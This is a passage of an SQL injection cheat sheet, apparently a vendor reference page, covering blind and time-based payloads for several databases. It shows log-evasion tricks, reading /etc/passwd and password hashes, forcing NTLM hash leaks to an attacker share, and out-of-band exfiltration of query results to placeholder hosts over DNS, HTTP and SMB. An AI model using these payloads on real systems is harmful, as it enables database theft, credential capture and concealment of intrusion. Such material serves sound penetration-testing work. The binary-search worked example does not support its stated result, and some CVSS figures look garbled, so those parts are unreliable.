**Binary Search for the First Character of a Table Name:**

| Response | Payload (Simplified logic) |
| :--- | :--- |
| **TRUE** | `SELECT ... WHERE ASCII(SUBSTRING((SELECT ... table name...),1,1))>78 --` |
| **FALSE** | `SELECT ... WHERE ASCII(SUBSTRING((SELECT ... table name...),1,1))>103 --` |
| **TRUE** | `SELECT ... WHERE ASCII(SUBSTRING((SELECT ... table name...),1,1)) < 94 --` |
| **FALSE** | `SELECT ... WHERE ASCII(SUBSTRING((SELECT ... table name...),1,1))>89 --` |
| **TRUE** | `SELECT ... WHERE ASCII(SUBSTRING((SELECT ... table name...),1,1)) < 84 --` |
| **FALSE** | `SELECT ... WHERE ASCII(SUBSTRING((SELECT ... table name...),1,1))>83 --` |
| **FALSE** | `SELECT ... WHERE ASCII(SUBSTRING((SELECT ... table name...),1,1))>80 --` |
| **FALSE** | `SELECT ... WHERE ASCII(SUBSTRING((SELECT ... table name...),1,1))` |

Since the last two queries both failed (were FALSE), we know the ASCII value is **80**, which corresponds to the letter **'P'**. This process is repeated for each character of the data you're extracting.

## Ways of making databases wait or sleep for blind SQL injection attacks
You should only use time-based payloads for **totally blind** injections. For normal blind injections, it’s better to use boolean-based methods to identify the difference in responses.

**Timing Considerations:** Be careful if using times longer than 20–30 seconds because the database API connection or script can time out.

### WAITFOR DELAY (S)
A CPU-safe way to make the database wait for a specified time.
```sql
WAITFOR DELAY '0:0:10'--
WAITFOR DELAY '0:0:0.51'  -- Fractional values are also allowed
```
**Sample Payloads:**
- Check if admin: `if (select user) = 'sa' waitfor delay '0:0:10'`
- Various injection points:
  - `1;waitfor delay '0:0:10'--`
  - `1);waitfor delay '0:0:10'--`
  - `1';waitfor delay '0:0:10'--`
  - `1');waitfor delay '0:0:10'--`
  - `1));waitfor delay '0:0:10'--`
  - `1'));waitfor delay '0:0:10'--`

### BENCHMARK() (M)
Intended for timing performance. We abuse it to consume CPU cycles and create a noticeable delay. Start with smaller values (e.g., 500,000) and increase to ensure stability without overloading the server.
```sql
BENCHMARK(how-many-repeats, expression-to-execute)
```
**Sample Payloads:**
- `IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1))`
- `IF (SELECT * FROM login) BENCHMARK(1000000,MD5(1))`

### pg_sleep() (P)
Sleep for the specified time in seconds.
```sql
SELECT pg_sleep(10);
```

### sleep() (M)
Sleep for the specified time in seconds.
```sql
SELECT sleep(10);
```

### dbms_pipe.receive_message() (O)
One of the best ways to create a delay in Oracle.
```sql
(SELECT CASE WHEN (condition) THEN dbms_pipe.receive_message(('xyz'),10) ELSE dbms_pipe.receive_message(('xyz'),1) END FROM dual)
```
If the condition is true, the response is delayed by 10 seconds. If false, the delay is only 1 second.

## How SQL injection attacks can be hidden from logs

### SQL Server log bypass using sp_password (S)
For security reasons, SQL Server doesn’t log queries that include the function `sp_password` (used for changing passwords). Appending `--sp_password` to an SQL query is enough to bypass logging.

**Example:** `'; SELECT * FROM users;--sp_password`
This query will execute your injection, but the `sp_password` string prevents it from being written to the SQL Server transaction logs. **Note:** This does not hide the request from web server logs.

## Tests to check if SQL injection is possible
Here are some quick checks to determine if blind SQL injections are possible.

**Testing `product.asp?id=4` (SMO):**

| Test Payload | Expected Outcome |
| :--- | :--- |
| `id=5-1` | Returns the same result as `id=4` if numeric injection is possible. |
| `id=4 OR 1=1` | Returns all products, or a different page than `id=4` alone. |

**Testing `product.asp?name=Book`:**

| Test Payload | Expected Outcome |
| :--- | :--- |
| `name=Bo'%2b'ok` | If the page lists the 'Book' product, string concatenation is possible. |
| `name=Bo' \|\| 'ok` | (only MO) Same as above for `\|\|` concatenation. |
| `name=Book' OR 'x'='x` | Should return all products, or a successful true condition. |

## Tips and tricks for working with MySQL
- **Working with users:**
    ```sql
    SELECT User,Password FROM mysql.user;
    SELECT ... INTO DUMPFILE (Writes the query result into a new file – cannot modify existing files)
    SELECT USER();
    SELECT password,USER() FROM mysql.user;
    ```
- **Abusing user-defined functions (UDF):**
    This requires the UDF DLL to be already on the server.
    ```sql
    create function LockWorkStation returns integer soname 'user32';
    select LockWorkStation();
    ```
- **Blind Data Extraction:**
    ```sql
    SELECT SUBSTRING(user_password,1,1) FROM mb_users WHERE user_group = 1;
    ```
- **Reading a file:**
    `http://site.com/query.php?user=1+union+select+load_file(0x2F6574632F706173737764),1,2,3`
- **Populating a table from a file:**
    Requires the `local_infile` setting to be enabled.
    ```sql
    CREATE TABLE foo( line blob ); 
    LOAD DATA INFILE 'c:/boot.ini' INTO TABLE foo;
    SELECT * FROM foo;
    ```
- **Timing-based tricks:**
    ```sql
    select benchmark( 500000, sha1( 'test' ) );
    select if( user() like 'root@%', benchmark(100000,sha1('test')), 'false' );
    select if( (ascii(substring(user(),1,1)) >> 7) & 1, benchmark(100000,sha1('test')), 'false' );
    ```

### Useful MySQL functions
`MD5()` , `SHA1()`, `PASSWORD()`, `ENCODE()`, `COMPRESS()` (useful for reading large binaries), `ROW_COUNT()`, `SCHEMA()`, `VERSION()`

## Second-order SQL injections
With a second-order SQL injection, your injected payload is stored somewhere by the application and then used somewhere, hopefully unfiltered because SQL injection wasn’t expected in that place. This is a common hidden layer problem.

**Example Scenario:**
You create a user account with a malicious username. This username is then used in an administrative backend query that is vulnerable.

**Payload for Name field:**
`Name: ' + (SELECT TOP 1 password FROM users ) + ' `
`Email: xx@xx.com`
If this name is later used unsafely in a query like `SELECT * FROM profiles WHERE name='$stored_name'`, the injected subquery will execute, potentially revealing a user's password in a response.

## Forcing SQL Server to get NTLM hashes
This attack can help you get the SQL Server user’s Windows password for the target server when your inbound connection is firewalled. The trick is to force SQL Server to connect to your Windows UNC share and then capture NTLM session data with a tool like Responder.

### Bulk insert from a UNC Share (S)
```sql
BULK INSERT foo FROM '\\your-ip-address\C$\x.txt'
```
When this query executes, the SQL Server service account will attempt to authenticate to your IP address, sending its NTLMv2 hash.

## Out-of-band channel attacks
An out-of-band (OOB) SQL injection is done when you need to exfiltrate data through a different channel than you used for the injection. DNS is one of the most common out-of-band channels because DNS requests are rarely blocked.

### Out-of-band injections for SQL Server
Both examples will send a DNS resolution request to `YOUR-INJECTION-HERE.example.com`:
```sql
?vulnerableParam=1; SELECT * FROM OPENROWSET('SQLOLEDB', (YOUR-INJECTION-HERE)+'.example.com';'sa';'pwd', 'SELECT 1')
?vulnerableParam=1; DECLARE @q varchar(1024); SET @q = '\\'+(YOUR-INJECTION-HERE)+'.example.com\\test.txt'; EXEC master..xp_dirtree @q
```
**Replace `YOUR-INJECTION-HERE` with:** `SELECT DB_NAME()` or a more complex subquery.

### Out-of-band injections for MySQL on Windows
These only work if the `secure_file_priv` setting is empty.

- **DNS Request:** `?vulnerableParam=-99 OR (SELECT LOAD_FILE(concat('\\\\',(YOUR-INJECTION-HERE), 'example.com\\')))`
- **Write data to a share:** `?vulnerableParam=-99 OR (SELECT (YOUR-INJECTION-HERE) INTO OUTFILE '\\\\example.com\\share\\output.txt')`

### Out-of-band injections for Oracle

| Method | Payload |
| :--- | :--- |
| **HTTP Request (GET)** | `?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/log.php?response='\|\|(YOUR-INJECTION-HERE)\|\|'') FROM DUAL)` |
| **Saving to access logs** | `?vulnerableParam=(SELECT UTL_HTTP.REQUEST('http://host/ '\|\|(YOUR-INJECTION-HERE)\|\|'.html') FROM DUAL)` |
| **DNS Request (via UTL_INADDR)** | `?vulnerableParam=(SELECT UTL_INADDR.get_host_addr((YOUR-INJECTION-HERE)\|\|'.example.com') FROM DUAL)` |
| **DNS Request (via DBMS_LDAP)** | `?vulnerableParam=(SELECT SYS.DBMS_LDAP.INIT((YOUR-INJECTION-HERE)\|\|'.example.com',80) FROM DUAL)` |

## SQL injection vulnerability classifications and severities

| Classification | ID / Severity |
| :--- | :--- |
| PCI DSS 4.0 | 6.2.4 |
| PCI DSS 3.2 (retired March 2024) | 6.5.1 |
| CWE | 89 |
| CAPEC | 66 |
| WASC | 19 |
| HIPAA | 164.306(a), 164.308(a) |
| ISO27001 | A.14.2.5 |
| ASVS 4.0 | 5.3.4 |
| NIST SP 800-53 | SI-10 |
| DISA STIG | V-16807 |
| OWASP API Security Top 10 2019 | API8 |
| OWASP API Security Top 10 2023 | Under API8 (Security Misconfiguration) and API10 (Unsafe Consumption of APIs) |
| OWASP Top 10 2021 | A03 (under Injection) |
| OWASP Top 10 2025 | A05 (under Injection) |
| **CVSS 3.0 Score** | |
| Base | 10 (Critical) |
| Temporal | 10 (Critical) |
| Environmental | 10 (Critical) |
| CVSS 3.0 Vector String | CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |
| **CVSS 3.1 Score** | |
| Base | 10 (Critical) |
| Temporal | 10 (Critical) |
| Environmental | 10 (Critical) |
| CVSS 3.1 Vector String | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H |
| **CVSS 4.0 Score** | |
| Base | 9.3 (Critical) |
| Exploitability | 8.9 (High) |
| Complexity | 8.9 (High) |
| Vulnerable system | 8.9 (High) |
| Subsequent system | 0.1 (Low) |
| Exploitation | 8.9 (High) |
| Security requirements | 8.9 (High) |
| CVSS 4.0 Vector String | CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N |
